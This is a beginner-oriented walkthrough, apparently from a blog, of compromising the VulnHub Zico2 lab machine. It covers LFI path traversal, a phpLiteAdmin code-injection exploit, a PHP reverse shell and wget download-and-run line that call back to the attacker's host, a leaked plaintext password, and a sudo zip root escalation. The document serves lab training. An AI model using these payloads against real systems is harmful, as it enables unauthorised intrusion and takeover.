---
layout: post
title: VulnHub Zico2 Writeup  
subtitle: Medium Machine
tags: [VulnHub]
---

# VulnHub Zico2 Writeup - A Beginner's Guide to Ethical Hacking

## Introduction

This writeup details the process of compromising the Zico2 machine from VulnHub, a platform that provides virtual machines for practicing ethical hacking skills. This guide is designed for beginners and will explain each step in detail, including the tools used and the reasoning behind each action.

## Initial Reconnaissance

### Identifying the Target Machine

The first task in any penetration testing scenario is to identify the target machine on the network. We use a tool called `nmap` (Network Mapper) to scan our subnet and discover active hosts.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.56.0/24   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 21:40 EDT
Nmap scan report for 192.168.56.106
Host is up (0.00024s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
```

In this output, we can see that the IP address 192.168.56.106 has three open ports: 22, 80, and 111. These correspond to SSH, HTTP, and RPC services respectively.

### Detailed Port Scan

Once we've identified our target, we perform a more detailed scan of the open ports to gather more information about the services running on them.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.56.106 -p 22,80,111 -sVC
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Zico's Shop
|_http-server-header: Apache/2.2.22 (Ubuntu)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40921/udp6  status
|   100024  1          51591/tcp6  status
|   100024  1          52516/udp   status
|_  100024  1          58980/tcp   status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This scan provides more details about each service:
- Port 22 is running OpenSSH 5.9p1 on Ubuntu
- Port 80 is running Apache httpd 2.2.22 on Ubuntu
- Port 111 is running rpcbind

## Web Server Enumeration

###  Exploring the Web Server

We start by examining the web server on port 80, as web applications often have vulnerabilities that can be exploited.

Navigating to `http://192.168.56.106/` in a web browser brings us to a page titled "ZICO'S SHOP". While exploring the links on the page, we notice that the "Ok... Show me the tools?!" link redirects to `http://192.168.56.106/view.php?page=tools.html`.

### Vuln 1: Testing for Local File Inclusion (LFI)

The URL structure `view.php?page=tools.html` suggests a potential Local File Inclusion (LFI) vulnerability. LFI allows an attacker to include files on a server through the web browser, which can lead to sensitive information disclosure or even remote code execution.

Read up more on it [here](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

To test for LFI, we try to access a common Linux system file:

```
http://192.168.56.106/view.php?page=../../../../../etc/passwd
```

If vulnerable, this should display the contents of the `/etc/passwd` file, which contains information about user accounts on the system.

```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.56.106/view.php?page=../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ntp:x:103:108::/home/ntp:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
statd:x:105:65534::/var/lib/nfs:/bin/false
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
zico:x:1000:1000:,,,:/home/zico:/bin/bash
```

The successful display of `/etc/passwd` confirms the presence of an LFI vulnerability.

### Further Web Server Enumeration

To discover more about the web server's structure, we use a tool called `feroxbuster` to brute-force directories:

```bash
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://192.168.56.106
[snip]
301      GET        9l       28w      318c http://192.168.56.106/dbadmin => http://192.1
[snip]
```

This scan reveals a `/dbadmin` directory. Navigating to `http://192.168.56.106/dbadmin` shows a directory listing containing a file named `test_dp.php`.

### Vuln2: phpLiteAdmin

Accessing `http://192.168.56.106/dbadmin/test_db.php` reveals that the server is running `phpLiteAdmin v1.9.3`. We attempt to log in using the common default password `admin`, which succeeds.

## Exploiting phpLiteAdmin

### Researching Vulnerabilities

A quick Google search for "phpLiteAdmin v1.9.3 vulnerabilities" leads us to an [ExploitDB page](https://www.exploit-db.com/exploits/24044) detailing a method to achieve remote code execution.

### Step 1: Preparing the Exploit

We create a PHP file named `shell.php` with the following content:

```php
<?php $sock=fsockopen("192.168.56.107",9001); exec("/bin/sh -i <&3 >&3 2>&3");?>
```

This script, when executed, will create a reverse shell connection back to our attacking machine. Make sure to replace the IP address with your machine's IP.

### Step 2: Setting Up Listeners

On our attacking machine, we set up two listeners:

1. To catch the reverse shell:
   ```bash
   nc -lvnp 9001
   ```

2. To serve our `shell.php` file:
   ```bash
   python3 -m http.server 80
   ```

### Step 3: Exploiting phpLiteAdmin

In phpLiteAdmin, we create a new database named `hack.php` with a table named `test`. We add a field with the following content:

```php
<?php system("wget 192.168.56.107/shell.php -O /tmp/shell.php; php /tmp/shell.php"); ?>
```

This code, when executed, will download our `shell.php` file and run it, establishing the reverse shell connection.

### Step 4: Triggering the Exploit

We trigger the exploit by accessing our malicious database file through the LFI vulnerability:

```
curl http://192.168.56.106/view.php?page=../../../../../usr/databases/hack.php
```

This should result in a shell connection on our `nc` listener:

```bash
┌──(kali㉿kali)-[~/vulnhub/zico2]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.56.107] from (UNKNOWN) [192.168.56.106] 45484
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Privilege Escalation

### Upgrading the Shell

We upgrade our basic shell to a more functional one:

```bash
python -c 'import pty;pty.spawn("/bin/bash")';
```

### Enumerating the System

While exploring the file system, we discover a `wp-config.php` file in `/home/zico/wordpress` containing credentials:

```
zico:sWfCsfJSPV9H3AmQzw8
```

### Logging in as Zico

We use these credentials to log in via SSH:

```bash
┌──(kali㉿kali)-[~/vulnhub/zico2]
└─$ ssh zico@192.168.56.106 
zico@192.168.56.106's password: 
zico@zico:~$ 
```

### Privilege Escalation to Root

We check Zico's sudo privileges:

```bash
zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```

Zico can run `zip` with sudo privileges. We can exploit this using a technique from [GTFOBins](https://gtfobins.github.io/#):

```bash
zico@zico:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 35%)
# id
uid=0(root) gid=0(root) groups=0(root)
```

We have successfully escalated to root!

## Conclusion

This walkthrough demonstrated the process of compromising the Zico2 machine, starting from initial reconnaissance, exploiting a web application vulnerability, and finally escalating privileges to root. Remember, these techniques should only be used in authorized, ethical hacking scenarios or on your own systems for educational purposes.
